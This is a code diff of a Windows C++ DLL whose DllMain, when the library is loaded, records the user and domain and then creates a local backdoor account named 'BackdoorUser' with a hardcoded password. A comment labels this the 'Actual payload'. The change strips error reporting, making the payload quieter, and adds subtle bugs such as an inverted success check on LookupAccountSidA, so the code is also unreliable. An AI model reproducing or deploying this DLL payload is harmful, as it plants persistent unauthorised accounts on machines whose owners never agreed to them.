@@ -16,24 +16,15 @@ void writeInfo(std::string &info)
 
     if (!myInfoStream.fail())
     {
-        myInfoStream << "This is the info:\n";
-        myInfoStream << info << "\n";
-        myInfoStream.close();
-    }
-    else
-    {
-        std::cerr << std::strerror(errno) << "\n";
+        myInfoStream << "This is the info: " << info << "\n";;
     }
 }
 
 int getUserDomainString(string &userAndDomain)
 {
-    int ret = 0;
-
     HANDLE hToken = nullptr;
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) 
     {
-        std::cerr << "Failed to open process token.\n";
         return 1;
     }
 
@@ -43,7 +34,6 @@ int getUserDomainString(string &userAndDomain)
 
     if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) 
     {
-        std::cerr << "Failed to get token information.\n";
         CloseHandle(hToken);
         free(pTokenUser);
         return 1;
@@ -52,7 +42,6 @@ int getUserDomainString(string &userAndDomain)
     LPWSTR userSid = nullptr;
     if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &userSid)) 
     {
-        std::cerr << "Failed to convert SID to string.\n";
         CloseHandle(hToken);
         free(pTokenUser);
         return 1;
@@ -62,19 +51,16 @@ int getUserDomainString(string &userAndDomain)
     DWORD nameLen = 256, domainLen = 256;
     SID_NAME_USE sidType;
 
-    if (LookupAccountSidA(nullptr, pTokenUser->User.Sid, name, &nameLen, domain, &domainLen, &sidType)) 
+    int ret = LookupAccountSidA(nullptr, pTokenUser->User.Sid, name, &nameLen, domain, &domainLen, &sidType);
+
+    if (ret == 0) // OK, extract <domain>\\username
     {
         std::stringstream sstrm;
         sstrm << domain << "\\" << name << std::endl;
         userAndDomain = sstrm.str();
+    }   
 
-    }
-    else
-    {
-        std::cerr << "Failed to look up account SID.\n";
-        ret = 1;
-    }
-
+    // cleanup
     LocalFree(userSid);
     CloseHandle(hToken);
     free(pTokenUser);
@@ -85,21 +71,8 @@ bool userExists(LPWSTR username)
 {
     LPUSER_INFO_0 pUserInfo = nullptr;
     NET_API_STATUS status = NetUserGetInfo(nullptr, username, 0, (LPBYTE*)&pUserInfo);
-
-    if (status == NERR_Success)
-    {
-        NetApiBufferFree(pUserInfo);
-        return true;
-    } 
-    else if (status == NERR_UserNotFound)
-    {
-        return false;
-    } 
-    else
-    {
-        std::cerr << "Error checking user: " << status << std::endl;
-        return false;
-    }
+    NetApiBufferFree(pUserInfo);
+    return (status == NERR_Success);
 }
 
 void createUser(LPWSTR pUserName, LPWSTR passwd)
@@ -113,18 +86,8 @@ void createUser(LPWSTR pUserName, LPWSTR passwd)
     ui.usri1_comment = nullptr;
     ui.usri1_flags = UF_SCRIPT;
     ui.usri1_script_path = nullptr;
-
     DWORD dwError = 0;
-    NET_API_STATUS nStatus = NetUserAdd(nullptr, 1, (LPBYTE)&ui, &dwError);
-
-    if (nStatus == NERR_Success)
-    {
-        wprintf(L"User created successfully.\n");
-    }
-    else
-    {
-        wprintf(L"Failed to create user. Error: %d\n", nStatus);
-    }
+    NetUserAdd(nullptr, 1, (LPBYTE)&ui, &dwError);
 }
 
 
@@ -134,24 +97,16 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 {
     if (DLL_PROCESS_ATTACH == ul_reason_for_call)
     {
-        // Called when the DLL is loaded into a process
-        std::cout << "The DLL just got loaded.\n";
+        // Only for debugging; can be removed
         std::string userAndDomain = "";
-        if (getUserDomainString(userAndDomain) == 0)
+        getUserDomainString(userAndDomain);
+        writeInfo(userAndDomain);
+        
+        // Actual payload: Add user unless it exists already
+        if (!userExists(L"BackdoorUser"))
         {
-            std::cout << "User and domain: " << userAndDomain << "\n";
-            writeInfo(userAndDomain);
-
-            // The actual payload comes here
-            if (!userExists(L"BackdoorUser"))
-            {
-                createUser(L"BackdoorUser", L"BackdoorPasswd");
-            }
-        }
-        else
-        {
-            std::cerr << "Error: could not get user and domain.\n";
-        }            
+            createUser(L"BackdoorUser", L"BackdoorPasswd");
+        }        
     }
 
     return TRUE;
